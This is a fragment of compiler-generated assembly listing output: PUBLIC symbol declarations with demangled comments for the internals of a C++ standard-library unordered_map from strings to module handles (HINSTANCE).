PUBLIC	?_Get_max_bucket_size@?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@std@@QEBAAEBMXZ ; std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >::_Get_max_bucket_size
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ; std::_Compressed_pair<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> >,std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,1>::_Get_first
PUBLIC	?clear@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAAXXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::clear
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@SA_KAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@@Z ; std::_Default_allocator_traits<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::max_size
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEBAAEBV?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@2@XZ ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Get_first
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SA_KAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@@Z ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::max_size
PUBLIC	?_Getal@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEBAAEBV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@XZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Getal
PUBLIC	?_Unchecked_splice@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@SAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@00@Z ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_splice
PUBLIC	?bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::bucket
PUBLIC	?_Min_load_factor_buckets@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Min_load_factor_buckets
PUBLIC	?_Max_bucket_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAAEBMXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Max_bucket_size
PUBLIC	?max_size@?$_Hash_vec@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEBA_KXZ ; std::_Hash_vec<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::max_size
PUBLIC	??F?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAAEAV01@XZ ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::operator--
PUBLIC	??0_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@QEAV12@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Clear_guard::_Clear_guard
PUBLIC	??1_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Clear_guard::~_Clear_guard
PUBLIC	?__autoclassinit2@?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAX_K@Z ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::__autoclassinit2
PUBLIC	?max_size@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA_KXZ ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::max_size
PUBLIC	?bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::bucket_count
PUBLIC	?max_load_factor@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBAMXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::max_load_factor
PUBLIC	?_Desired_grow_bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Desired_grow_bucket_count
PUBLIC	?_Forced_rehash@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAX_K@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Forced_rehash
PUBLIC	??1?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
PUBLIC	??R?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@QEBA_NAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@0@Z ; std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >::operator()
PUBLIC	?_Get_first@?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@std@@QEBAAEBU?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ ; std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>::_Get_first
PUBLIC	?_Insert_new_node_before@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_KQEAU32@1@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Insert_new_node_before
PUBLIC	?_Check_max_size@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBAXXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Check_max_size
PUBLIC	?_Check_rehash_required_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_NXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Check_rehash_required_1
PUBLIC	?_Rehash_for_1@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXXZ ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Rehash_for_1
PUBLIC	??0?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@std@@QEAA@XZ ; std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >
PUBLIC	?_Release@?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@XZ ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::_Release
PUBLIC	??1?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ ; std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
PUBLIC	??$_Hash_array_representation@D@std@@YA_KQEBD_K@Z ; std::_Hash_array_representation<char>
PUBLIC	??$addressof@$$CBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@YAPEBV?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@0@AEBV10@@Z ; std::addressof<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > const >
PUBLIC	??$construct_at@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@AEAPEAU12@$0A@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@QEAPEAU10@AEAPEAU10@@Z ; std::construct_at<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *,std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &,0>
PUBLIC	??$forward@AEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z ; std::forward<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> * &>
PUBLIC	??$addressof@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAPEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@AEAPEAU10@@Z ; std::addressof<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *>
